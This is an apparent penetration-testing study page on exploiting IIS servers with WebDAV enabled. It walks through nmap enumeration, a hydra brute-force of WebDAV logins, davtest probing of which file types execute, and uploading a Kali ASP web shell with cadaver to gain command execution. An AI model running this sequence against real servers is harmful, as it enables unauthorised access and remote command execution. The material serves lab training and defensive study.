# Frequently exploited Windows Services

&#x20; &#x20;

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

## IIS WebDAV

### General information

#### IIS

* Default ports

```
80, 443
```

* Supported executed files

```
.asp
.aspx
.config
.php
```

#### WebDAV

WebDAV is a protocol that allows you to edit web content on a server using HTTP or HTTPS connections. It has advantages over FTP such as more security options and file locking.

* Default ports

```
80, 443
```

* Needs legitimate credentials, since it implements authentication in form of a username/password



### Steps of exploitation

1. Enumeration. Identify whether WebDAV has been configured to run on the IIS web server.
2. Brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.&#x20;
3. Upload a malicious (like a .asp payload) and execute arbitrary commands or obtain a reverse shell on the target.

#### Useful tools

* [davtest](https://code.google.com/archive/p/davtest/) -> Used to scan. authenticate and exploit a WebDAV server.
* [cadaver](https://github.com/notroj/cadaver) -> Supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.

### Exploitation

#### nmap

```sh
nmap -sV -sC $IP
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

* nmap deep dive

```sh
nmap -sv -p 80 --script=http-enum $IP
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

#### Bruteforce the authentication

The address will be `http://%IP/webdav/`

{% code overflow="wrap" %}
```sh
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt $IP http-get /webdav/
```
{% endcode %}



#### davtest

```sh
davtest -auth admin:password_123 -url http://$IP/webdav
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

* The most important section of the output, with that we can see that .asp can be executed and we can get our reverse shell wih that

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

#### cadaver

```shell
cadaver http://$IP/webdav

Put credentials and get a cmd shell
```

* Use kali linux pre-package web shells to upload a file and get access

Folder:

```bash
/usr/share/webshells
```

![](<../../.gitbook/assets/image (23).png>)

* Using the cadaver shell upload the web shell

```sh
put /usr/share/webshells/asp/cmd
```

* Go via UI and execute the web shell

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
